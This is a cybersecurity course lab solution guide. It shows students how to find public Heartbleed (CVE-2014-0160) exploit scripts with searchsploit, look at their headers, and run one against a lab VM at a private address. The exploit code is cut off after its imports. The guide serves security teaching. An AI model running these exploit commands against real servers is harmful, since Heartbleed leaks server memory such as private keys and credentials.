## Solution Guide: Heartbleed and SearchSploit

The goal of this activity was to identify and exploit the Heartbleed vulnerability on the vulnerable machine.

---

1. Use `searchsploit` to identify Heartbleed exploits:

   - `searchsploit heartbleed`

2. Inspect the Python exploits you identify:

   - The two Python exploits are `32745.py` and `32764.py`. They both check a server for Heartbleed. 
  
  
    Inspect the first with `searchsploit -x 32745.py`.

      ```bash
      $ searchsploit -x 32745.py

      ### BELOW DISPLAYED IN `less`
      #!/usr/bin/python

      # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
      # The author disclaims copyright to this source code.

      import sys
      import struct
      import socket
      import time
      import select
      import re
      from optparse import OptionParser
      ...
      ```

    Inspect the second with `searchsploit -x 32764.py`.


      ```bash
      $ searchsploit -x 32764.py

      ### BELOW DISPLAYED IN less
      # Exploit Title: [OpenSSL TLS Heartbeat Extension - Memory Disclosure - Multiple SSL/TLS versions]
      # Date: [2014-04-09]
      # Exploit Author: [Csaba Fitzl]
      # Vendor Homepage: [http://www.openssl.org/]
      # Software Link: [http://www.openssl.org/source/openssl-1.0.1f.tar.gz]
      # Version: [1.0.1f]
      # Tested on: [N/A]
      # CVE : [2014-0160]


      #!/usr/bin/env python

      # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
      # The author disclaims copyright to this source code.
      # Modified by Csaba Fitzl for multiple SSL / TLS version support
      ...
      ```

   - Note the last line: `# Modified by Csaba Fitzl for multiple SSL / TLS version support`. 
  
   The two scripts are the same, but the second one has SSL/TLS support.
  
   - `32764.py` is an updated version of `32745.py` that adds SSL/TLS support.

3. Move to the directory containing the exploit that adds SSL/TLS support and attempt to run it against the Heartbleed VM:
   - `cd /usr/share/exploitdb/exploits/multiple/remote && python 32764.py 192.168.0.22`
   
   or

   - `cd /usr/share/exploitdb/exploits/multiple/remote` then `python 32764.py 192.168.0.22`
      -  The command should report a vulnerable server, indicating that the exploit was successful.

---
&copy; 2020 Trilogy Education Services, a 2U Inc Brand.   All Rights Reserved.
